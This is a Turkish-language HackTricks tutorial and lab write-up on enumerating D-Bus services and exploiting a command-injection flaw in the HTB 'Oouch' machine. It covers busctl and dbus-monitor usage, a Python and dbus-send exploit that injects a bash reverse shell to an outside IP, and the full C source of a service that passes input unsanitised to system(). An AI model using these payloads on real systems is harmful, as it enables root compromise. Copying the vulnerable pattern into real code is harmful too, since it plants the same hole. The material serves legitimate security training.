# D-Bus Enumeration & Command Injection Privilege Escalation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **GUI enumeration**

D-Bus, Ubuntu masaüstü ortamlarında süreçler arası iletişim (IPC) arabulucusu olarak kullanılmaktadır. Ubuntu'da, birkaç mesaj otobüsünün eşzamanlı çalışması gözlemlenmektedir: **sistem otobüsü**, esasen **sistem genelinde ilgili hizmetleri sergilemek için ayrıcalıklı hizmetler tarafından kullanılan** ve her giriş yapan kullanıcı için yalnızca o kullanıcıya özgü hizmetleri sergileyen bir oturum otobüsü. Burada odak, ayrıcalıkları yükseltme amacımız olduğundan, daha yüksek ayrıcalıklarla (örneğin, root) çalışan hizmetlerle ilişkisi nedeniyle esasen sistem otobüsündedir. D-Bus'un mimarisinin, istemcilerin iletişim kurmak istedikleri hizmet için belirttikleri adrese göre istemci mesajlarını uygun hizmetlere yönlendiren bir 'yönlendirici' kullandığı belirtilmektedir.

D-Bus üzerindeki hizmetler, sergiledikleri **nesneler** ve **arayüzler** ile tanımlanır. Nesneler, standart OOP dillerindeki sınıf örneklerine benzetilebilir; her örnek, bir **nesne yolu** ile benzersiz bir şekilde tanımlanır. Bu yol, bir dosya sistemi yoluna benzer şekilde, hizmet tarafından sergilenen her nesneyi benzersiz bir şekilde tanımlar. Araştırma amaçları için önemli bir arayüz, **org.freedesktop.DBus.Introspectable** arayüzüdür ve tek bir yöntemi, Introspect'i içerir. Bu yöntem, nesnenin desteklediği yöntemlerin, sinyallerin ve özelliklerin XML temsilini döndürür; burada yöntemlere odaklanılmakta, özellikler ve sinyaller hariç tutulmaktadır.

D-Bus arayüzü ile iletişim kurmak için iki araç kullanılmıştır: D-Bus tarafından sergilenen yöntemlerin betiklerde kolayca çağrılmasını sağlayan **gdbus** adlı bir CLI aracı ve her otobüsteki mevcut hizmetleri listelemek ve her hizmetteki nesneleri görüntülemek için tasarlanmış Python tabanlı bir GUI aracı olan [**D-Feet**](https://wiki.gnome.org/Apps/DFeet).
```bash
sudo apt-get install d-feet
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)


İlk resimde D-Bus sistem otobüsüne kaydedilen hizmetler gösterilmektedir, **org.debin.apt** özellikle Sistem Otobüsü düğmesi seçildikten sonra vurgulanmıştır. D-Feet bu hizmetten nesneleri sorgular, seçilen nesneler için arayüzleri, yöntemleri, özellikleri ve sinyalleri gösterir, bu ikinci resimde görülmektedir. Her yöntemin imzası da detaylandırılmıştır.

Dikkate değer bir özellik, hizmetin **işlem kimliği (pid)** ve **komut satırı** bilgilerini göstermesidir; bu, hizmetin yükseltilmiş ayrıcalıklarla çalışıp çalışmadığını doğrulamak için yararlıdır, araştırma açısından önemlidir.

**D-Feet ayrıca yöntem çağrısı yapmaya da olanak tanır**: kullanıcılar parametre olarak Python ifadeleri girebilir, D-Feet bunları hizmete iletmeden önce D-Bus türlerine dönüştürür.

Ancak, **bazı yöntemlerin kimlik doğrulaması gerektirdiğini** unutmayın; bu yöntemleri çağırmamıza izin vermeden önce kimlik doğrulaması yapılması gerekir. Biz bu yöntemleri göz ardı edeceğiz, çünkü amacımız öncelikle kimlik bilgisi olmadan ayrıcalıklarımızı yükseltmektir.

Ayrıca, bazı hizmetlerin, bir kullanıcının belirli eylemleri gerçekleştirmesine izin verilip verilmeyeceğini sorgulamak için org.freedeskto.PolicyKit1 adlı başka bir D-Bus hizmetini sorguladığını unutmayın.

## **Cmd line Enumeration**

### Hizmet Nesnelerini Listele

Açık D-Bus arayüzlerini listelemek mümkündür:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
#### Bağlantılar

[Wikipedia'dan:](https://en.wikipedia.org/wiki/D-Bus) Bir süreç bir busa bağlantı kurduğunda, bus bu bağlantıya _benzersiz bağlantı adı_ denilen özel bir bus adı atar. Bu tür bus adları değişmezdir—bağlantı var olduğu sürece değişmeyeceği garanti edilir—ve daha da önemlisi, bus ömrü boyunca yeniden kullanılamazlar. Bu, o bus'a başka bir bağlantının asla böyle bir benzersiz bağlantı adı almayacağı anlamına gelir, aynı süreç bus'a olan bağlantıyı kapatıp yeni bir tane oluşturursa bile. Benzersiz bağlantı adları, aksi takdirde yasak olan, iki nokta üst üste karakteri ile başladıkları için kolayca tanınabilir.

### Servis Nesnesi Bilgisi

Sonra, arayüz hakkında bazı bilgileri elde edebilirsiniz:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
### Bir Servis Nesnesinin Arayüzlerini Listele

Yeterli izinlere sahip olmalısınız.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Bir Servis Nesnesinin Arayüzünü İnceleme

Bu örnekte, `tree` parametresi kullanılarak keşfedilen en son arayüzün seçildiğine dikkat edin (_önceki bölüme bakın_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Not edin ki `htb.oouch.Block` arayüzünün `.Block` metodu (ilgilendiğimiz olan). Diğer sütunlardaki "s" bir string beklediğini gösterebilir.

### İzleme/Yakalama Arayüzü

Yeterli ayrıcalıklara sahip olduğunuzda (sadece `send_destination` ve `receive_sender` ayrıcalıkları yeterli değildir) **D-Bus iletişimini izleyebilirsiniz**.

Bir **iletişimi izlemek** için **root** olmanız gerekecek. Hala root olma konusunda sorun yaşıyorsanız [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) ve [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus) adreslerine bakın.

{% hint style="warning" %}
Eğer bir D-Bus yapılandırma dosyasını **root olmayan kullanıcıların iletişimi dinlemesine izin verecek şekilde yapılandırmayı** biliyorsanız lütfen **benimle iletişime geçin**!
{% endhint %}

İzleme için farklı yollar:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
Aşağıdaki örnekte `htb.oouch.Block` arayüzü izleniyor ve **"**_**lalalalal**_**" mesajı yanlış iletişim yoluyla gönderiliyor**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
`capture` yerine `monitor` kullanarak sonuçları bir pcap dosyasında kaydedebilirsiniz.

#### Tüm gürültüyü filtreleme <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Eğer busta çok fazla bilgi varsa, şu şekilde bir eşleşme kuralı geçirin:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Birden fazla kural belirtilebilir. Eğer bir mesaj _herhangi_ bir kural ile eşleşiyorsa, mesaj yazdırılacaktır. Böyle:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Daha fazla bilgi için [D-Bus belgelerine](http://dbus.freedesktop.org/doc/dbus-specification.html) bakın.

### Daha Fazla

`busctl`'nin daha fazla seçeneği vardır, [**hepsini burada bulabilirsiniz**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Zayıf Senaryo**

**HTB'den "oouch" ana bilgisayarında qtc kullanıcısı olarak** _/etc/dbus-1/system.d/htb.oouch.Block.conf_ konumunda bulunan **beklenmedik bir D-Bus yapılandırma dosyası** bulabilirsiniz:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Not: Önceki yapılandırmadan, **bu D-BUS iletişimi aracılığıyla bilgi göndermek ve almak için `root` veya `www-data` kullanıcısı olmanız gerektiğini unutmayın.**

Docker konteyneri **aeb4525789d8** içindeki **qtc** kullanıcısı olarak, _/code/oouch/routes.py_ dosyasında bazı dbus ile ilgili kodlar bulabilirsiniz. Bu ilginç kod:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Gördüğünüz gibi, **D-Bus arayüzüne bağlanıyor** ve **"Block" fonksiyonuna** "client\_ip" gönderiyor.

D-Bus bağlantısının diğer tarafında bazı C derlenmiş ikili dosyalar çalışıyor. Bu kod, D-Bus bağlantısında **IP adresini dinliyor ve verilen IP adresini engellemek için `system` fonksiyonu aracılığıyla iptables'ı çağırıyor.**\
**`system` çağrısı, komut enjeksiyonuna karşı kasıtlı olarak savunmasızdır, bu nedenle aşağıdaki gibi bir yük, ters bir shell oluşturacaktır:** `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Sömür

Bu sayfanın sonunda **D-Bus uygulamasının tam C kodunu** bulabilirsiniz. İçinde, 91-97. satırlar arasında **`D-Bus nesne yolu`** **ve `arayüz adı`nın** **nasıl kaydedildiğini** bulabilirsiniz. Bu bilgi, D-Bus bağlantısına bilgi göndermek için gerekli olacaktır:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Ayrıca, 57. satırda **bu D-Bus iletişimi için kayıtlı tek yöntem** `Block` olarak adlandırıldığını görebilirsiniz (_**Bu yüzden, bir sonraki bölümde yükler hizmet nesnesi `htb.oouch.Block`, arayüz `/htb/oouch/Block` ve yöntem adı `Block`'a gönderilecektir**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Aşağıdaki python kodu, `block_iface.Block(runme)` aracılığıyla `Block` yöntemine D-Bus bağlantısına yükü gönderecektir (_önceki kod parçasından alındığını unutmayın_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl ve dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
* `dbus-send`, "Message Bus" a mesaj göndermek için kullanılan bir araçtır.
* Message Bus – Sistemlerin uygulamalar arasında iletişim kurmasını kolaylaştıran bir yazılımdır. Mesaj Kuyruğu ile ilgilidir (mesajlar sıralı bir şekilde düzenlenir) ancak Message Bus'ta mesajlar bir abonelik modeli ile gönderilir ve ayrıca çok hızlıdır.
* “-system” etiketi, bunun bir oturum mesajı değil, bir sistem mesajı olduğunu belirtmek için kullanılır (varsayılan olarak).
* “–print-reply” etiketi, mesajımızı uygun bir şekilde yazdırmak ve herhangi bir yanıtı insan tarafından okunabilir formatta almak için kullanılır.
* “–dest=Dbus-Interface-Block” Dbus arayüzünün adresidir.
* “–string:” – Arayüze göndermek istediğimiz mesajın türüdür. Mesaj göndermenin birkaç formatı vardır: double, bytes, booleans, int, objpath. Bunlardan “object path”, bir dosyanın yolunu Dbus arayüzüne göndermek istediğimizde kullanışlıdır. Bu durumda, bir dosya adıyla arayüze bir komut iletmek için özel bir dosya (FIFO) kullanabiliriz. “string:;” – Bu, FIFO ters kabuk dosyası/komutunun yerini aldığımızda nesne yolunu tekrar çağırmak içindir.

_Not: `htb.oouch.Block.Block` içinde, ilk kısım (`htb.oouch.Block`) hizmet nesnesini, son kısım ise (`.Block`) yöntem adını referans alır._

### C kodu

{% code title="d-bus_server.c" %}
```c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
{% endcode %}

## Referanslar
* [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

{% hint style="success" %}
AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
